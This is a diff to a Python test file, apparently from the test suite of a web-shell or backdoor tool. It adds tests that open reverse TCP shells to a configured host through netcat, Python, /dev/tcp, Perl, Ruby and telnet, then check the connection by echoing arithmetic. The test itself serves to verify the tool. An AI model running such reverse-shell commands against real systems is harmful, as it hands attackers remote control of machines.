@@ -55,6 +55,11 @@ class Backdoors(TestCase):
         testvalue = randint(1,100)*2
         self._check_oob_shell(':backdoor.reversetcp %s\r\n' % conf['backdoor_reverse_tcp_host'], 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
         
+        testvectors = [ [v,  randint(20000,25000)] for v in ('netcat-traditional', 'netcat-bsd', 'python', 'devtcp', 'perl', 'ruby', 'telnet') ]
+        for vector in testvectors:
+            self._check_oob_shell(':backdoor.reversetcp %s -vector %s -port %i\r\n' % (conf['backdoor_reverse_tcp_host'], vector[0], vector[1]), 'echo $((%i+%i));\r\n' % (testvalue/2, testvalue/2), testvalue )
+        
+        
     @skipIf(not conf['backdoor_reverse_tcp_startport'] or not conf['backdoor_reverse_tcp_endport'] or not conf['backdoor_reverse_tcp_host'], "Skipping backdoor reverse connect")        
     def test_reverse_tcp_error(self):
         self._check_oob_shell_errors(':backdoor.reversetcp %s -port 80\r\n' % conf['backdoor_reverse_tcp_host'],   WARN_BINDING_SOCKET)
